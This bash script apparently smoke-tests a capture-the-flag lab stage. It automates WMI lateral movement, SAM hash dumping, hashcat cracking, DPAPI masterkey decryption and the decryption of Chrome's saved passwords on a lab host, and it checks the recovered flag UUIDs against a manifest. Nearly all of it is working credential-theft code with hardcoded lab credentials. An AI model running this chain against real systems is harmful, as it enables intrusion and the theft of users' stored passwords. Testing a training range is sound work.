#!/usr/bin/env bash
# smoke_m3_chrome.sh -- standalone M3 smoke (areuben-ws, charlie) that walks
# the intended chain from kali, requiring only morgana.lefey's M2.s3 password.
# Exercises:
#
#   [M3.s1]  nxc wmiexec as morgana (local admin via DCOM/WMI) -> type
#            C:\Users\Public\session.txt -> session-token UUID
#   [SAM]    impacket-secretsdump via morgana -> areuben's NT hash
#   [CRACK]  hashcat -m 1000 (rockyou, no rules) -> areuben plaintext logon
#            (needed for the DPAPI SHA1 KDF; the NT hash alone won't do on Win11)
#   [PULL]   smbclient -> areuben DPAPI masterkey + Chrome Local State + Login Data
#   [MK]     impacket-dpapi masterkey (-password) -> decrypted user masterkey
#   [KEY]    impacket-dpapi unprotect Local State 'encrypted_key' -> Chrome AES key
#   [M3.s2]  AES-GCM v10 decrypt of Login Data password_value -> the flag UUID
#
# Run against a CLEAN, agent-free range (it reads pre-planted artifacts).
# Usage: bash smoke_m3_chrome.sh [--manifest PATH] [--logdir DIR]
#                                [--areuben-pass PW] [--wordlist PATH]
set -uo pipefail

AREUBEN_WS_IP="10.20.0.100"
DOMAIN="charlie.local"
MORGANA_USER="morgana.lefey"
MORGANA_PASS="Welcome123"
AREUBEN_USER="areuben"

MANIFEST=""
LOGDIR="/tmp/smoke-m3-$$"
AREUBEN_PASS=""                       # override; otherwise cracked from the hash
WORDLIST="/usr/share/wordlists/rockyou.txt"

while [ $# -gt 0 ]; do
    case "$1" in
        --manifest)     MANIFEST="$2"; shift 2 ;;
        --logdir)       LOGDIR="$2"; shift 2 ;;
        --areuben-pass) AREUBEN_PASS="$2"; shift 2 ;;
        --wordlist)     WORDLIST="$2"; shift 2 ;;
        -h|--help)      sed -n '2,20p' "$0"; exit 0 ;;
        *) echo "unknown arg: $1"; exit 2 ;;
    esac
done
mkdir -p "$LOGDIR"; cd "$LOGDIR"
PASS=0; FAIL=0

c_red(){ printf '\033[31m%s\033[0m' "$*"; }; c_green(){ printf '\033[32m%s\033[0m' "$*"; }
c_blue(){ printf '\033[34m%s\033[0m' "$*"; }
section(){ echo; echo "============================================================"; echo " [$(c_blue "$1")] $2"; echo "============================================================"; }
ok(){  echo "  $(c_green ok): $*";   PASS=$((PASS+1)); }
bad(){ echo "  $(c_red FAIL): $*";   FAIL=$((FAIL+1)); }
note(){ echo "  - $*"; }

# resolve manifest (arg, /tmp copy from `make smoke-m3`, or repo)
[ -z "$MANIFEST" ] && for c in /tmp/manifest.yaml "$(dirname "$0")/../flags/manifest.yaml"; do
    [ -f "$c" ] && MANIFEST="$c" && break; done
manifest_uuid(){ python3 -c "import yaml;print(next(e['uuid'] for e in yaml.safe_load(open('$MANIFEST'))['flags'] if e['id']=='$1'))" 2>/dev/null; }
M3S1=$(manifest_uuid m3.s1); M3S2=$(manifest_uuid m3.s2)
[ -n "$M3S1" ] && [ -n "$M3S2" ] || { echo "ERROR: could not read m3.s1/m3.s2 from manifest ($MANIFEST)"; exit 2; }

for t in nxc impacket-secretsdump impacket-smbclient impacket-dpapi python3; do
    command -v "$t" >/dev/null 2>&1 || { echo "missing required tool: $t"; exit 2; }
done

smb(){ printf '%b' "$1" | impacket-smbclient "$DOMAIN/$MORGANA_USER:$MORGANA_PASS@$AREUBEN_WS_IP" 2>>"$LOGDIR/smb.log"; }

# ---- M3.s1 -----------------------------------------------------------------
section M3.s1 "DCOM/WMI lateral as morgana -> read session.txt"
S1=$(nxc smb "$AREUBEN_WS_IP" -d "$DOMAIN" -u "$MORGANA_USER" -p "$MORGANA_PASS" \
        -x 'type C:\Users\Public\session.txt' --exec-method wmiexec 2>>"$LOGDIR/m3s1.log" | grep -oiE '[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}' | head -1)
if [ "${S1,,}" = "${M3S1,,}" ]; then ok "m3.s1 recovered: $S1"; else bad "m3.s1 mismatch (got '${S1:-<none>}', want $M3S1)"; fi

# ---- areuben NT hash via SAM (we are local admin through morgana) -----------
section SAM "secretsdump SAM -> areuben NT hash"
HASH=$(impacket-secretsdump "$DOMAIN/$MORGANA_USER:$MORGANA_PASS@$AREUBEN_WS_IP" 2>>"$LOGDIR/sam.log" \
        | grep -iE "^$AREUBEN_USER:" | head -1 | awk -F: '{print $4}')
if [ -n "$HASH" ]; then ok "areuben NT hash: $HASH"; else bad "could not dump areuben NT hash"; fi

# ---- crack to plaintext (DPAPI needs the password, not the hash) ------------
section CRACK "hashcat -m 1000 areuben hash (rockyou, no rules)"
# kali ships rockyou gzipped (rockyou.txt.gz); extract it if the plain file
# is absent. --force lets hashcat run on a CPU-only/headless box.
if [ ! -f "$WORDLIST" ] && [ -f "$WORDLIST.gz" ]; then
    gunzip -c "$WORDLIST.gz" > "$LOGDIR/rockyou.txt" 2>/dev/null && WORDLIST="$LOGDIR/rockyou.txt"
fi
if [ -z "$AREUBEN_PASS" ] && [ -n "$HASH" ] && command -v hashcat >/dev/null 2>&1 && [ -f "$WORDLIST" ]; then
    echo "$HASH" > "$LOGDIR/areuben.hash"
    hashcat -m 1000 -a 0 "$LOGDIR/areuben.hash" "$WORDLIST" --potfile-path "$LOGDIR/m3.pot" \
        --force --quiet -o "$LOGDIR/cracked.txt" >>"$LOGDIR/crack.log" 2>&1 || true
    AREUBEN_PASS=$(awk -F: 'NF{print $NF}' "$LOGDIR/cracked.txt" 2>/dev/null | head -1)
fi
if [ -n "$AREUBEN_PASS" ]; then ok "areuben password: $AREUBEN_PASS"; else bad "no areuben password (crack failed; pass --areuben-pass)"; fi

# ---- pull DPAPI masterkey + Chrome Local State + Login Data -----------------
section PULL "smbclient -> masterkey + Local State + Login Data"
PROT="\\\\Users\\\\$AREUBEN_USER\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect"
SID=$(smb "use C\$\ncd $PROT\nls\nexit\n" | grep -oE 'S-1-5-21-[0-9-]+-1000' | head -1)
if [ -n "$SID" ]; then ok "areuben SID: $SID"; else bad "could not find areuben SID under Protect\\"; fi
MKGUID=$(smb "use C\$\ncd $PROT\\\\$SID\nls\nexit\n" \
            | grep -oiE '[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}' | grep -viE 'Preferred' | head -1)
if [ -n "$MKGUID" ]; then ok "masterkey GUID: $MKGUID"; else bad "could not find masterkey GUID"; fi
smb "use C\$\nlcd $LOGDIR\ncd $PROT\\\\$SID\nget $MKGUID\ncd \\\\Users\\\\$AREUBEN_USER\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\nget Local State\ncd Default\nget Login Data\nexit\n" >/dev/null
for f in "$MKGUID" "Local State" "Login Data"; do
    [ -s "$LOGDIR/$f" ] && note "pulled: $f ($(stat -c %s "$LOGDIR/$f") B)" || bad "missing pulled file: $f"
done

# ---- decrypt masterkey -> chrome AES key -> the flag ------------------------
section MK "impacket-dpapi masterkey (-password)"
MK=$(impacket-dpapi masterkey -file "$LOGDIR/$MKGUID" -sid "$SID" -password "$AREUBEN_PASS" 2>>"$LOGDIR/dpapi.log" \
        | grep -oiE '0x[0-9a-f]{16,}' | head -1)
if [ -n "$MK" ]; then ok "masterkey decrypted (${MK:0:18}...)"; else bad "masterkey decrypt failed"; fi

section KEY "unprotect Chrome Local State AES key"
python3 -c "import base64,json;open('$LOGDIR/chrome_enc_key.bin','wb').write(base64.b64decode(json.load(open('$LOGDIR/Local State'))['os_crypt']['encrypted_key'])[5:])" 2>>"$LOGDIR/dpapi.log"
# Parse only the hex-byte columns of impacket's hexdump (offset + up to 16
# pairs), never the ASCII column -- a loose grep over-captures and yields a
# 34-byte "key" that AESGCM rejects.
AESHEX=$(impacket-dpapi unprotect -file "$LOGDIR/chrome_enc_key.bin" -key "$MK" 2>>"$LOGDIR/dpapi.log" \
            | python3 -c '
import re, sys
out = []
for line in sys.stdin:
    m = re.match(r"\s*[0-9A-Fa-f]{4}\s+((?:[0-9A-Fa-f]{2}[ ]+){1,16})", line)
    if m:
        out.append("".join(m.group(1).split()))
print("".join(out))
')
if [ "${#AESHEX}" -eq 64 ]; then ok "chrome AES key recovered (32 bytes)"; else bad "chrome AES key recovery failed (got ${#AESHEX} hex)"; fi

section M3.s2 "AES-GCM v10 decrypt of Login Data -> flag"
S2=$(AESHEX="$AESHEX" LDB="$LOGDIR/Login Data" python3 <<'PY' 2>>"$LOGDIR/dpapi.log"
import os, sqlite3
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
aes = bytes.fromhex(os.environ["AESHEX"])
for url, user, pw in sqlite3.connect(os.environ["LDB"]).execute(
        "SELECT origin_url, username_value, password_value FROM logins"):
    try:
        print(AESGCM(aes).decrypt(pw[3:15], pw[15:], None).decode()); break
    except Exception: pass
PY
)
if [ "${S2,,}" = "${M3S2,,}" ]; then ok "m3.s2 recovered: $S2"; else bad "m3.s2 mismatch (got '${S2:-<none>}', want $M3S2)"; fi

echo; echo "============================================================"
echo " M3 smoke: $(c_green "$PASS ok"), $([ "$FAIL" -gt 0 ] && c_red "$FAIL FAIL" || echo "0 FAIL")   logs: $LOGDIR"
echo "============================================================"
[ "$FAIL" -eq 0 ]
